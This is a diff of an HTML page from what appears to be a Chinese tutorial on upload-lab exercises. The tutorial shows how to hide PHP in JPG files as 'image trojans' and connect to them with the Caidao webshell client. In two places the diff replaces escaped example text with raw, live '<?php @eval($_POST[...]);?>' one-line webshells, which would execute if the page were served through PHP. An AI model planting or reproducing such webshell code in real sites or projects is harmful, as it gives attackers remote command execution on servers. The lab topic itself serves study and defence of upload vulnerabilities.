@@ -497,7 +497,7 @@
 </blockquote>
 <p>准备一张正常图片（a.jpg）,新建一个文件内容写入以下代码（b.php）</p>
 <blockquote>
-<p>&lt;?php @eval($_POST[‘cmd’]);?&gt;</p>
+<?php @eval($_POST['cmd']);?>
 </blockquote>
 <p>使用以下命令生成图片木马muma.jpg</p>
 <blockquote>
@@ -510,7 +510,7 @@
 <p><img src="https://i.imgur.com/c0nkpZb.png" alt=""></p>
 <p>换种方法<br>使用二进制编辑工具（比如winhex,utrl editor等等）直接写恶意代码到文件尾部。<br>这里我使用winhex给大家演示<br><img src="https://i.imgur.com/8nn3B4q.png" alt=""><br>访问后<br><img src="https://i.imgur.com/1bjaxFc.png" alt=""><br>没反应？？？<br>难道是我打开的姿势不对<br>我要换个姿势打开<br><img src="https://i.imgur.com/Cf3BuYH.png" alt=""><br>卧槽这么神奇，<br>马萨卡？之前的也可以用这么搞吗，换成12关试试<br><img src="https://i.imgur.com/KWqDaSJ.png" alt=""><br>还是上传成功了，图片🐎恐怖如斯<br><img src="https://i.imgur.com/V6Hvf47.png" alt=""><br>还有谁，还有什么可以阻止图片🐎的吗<br>不过，这个图片🐎应该还是要结合文件包含漏洞的，<br>试试看，菜刀能不能连上这个图片🐎<br><img src="https://i.imgur.com/rh9zcwU.png" alt=""><br>貌似不可以<br>额，原来我漏了一段url，图片🐎是可以作为webshell的<br>（啧啧，斗🐎强者恐怖如斯）<br>不过我们也可以利用图片马加上代码执行，可以生成一个webshell</p>
 <blockquote>
-<p>如：echo“&lt;?php @eval($_POST[‘caidao’]);?&gt;” &gt; x.php</p>
+<p>如：echo“<?php @eval($_POST['caidao']);?>” &gt; x.php</p>
 </blockquote>
 <p>具体可以看</p>
 <blockquote>
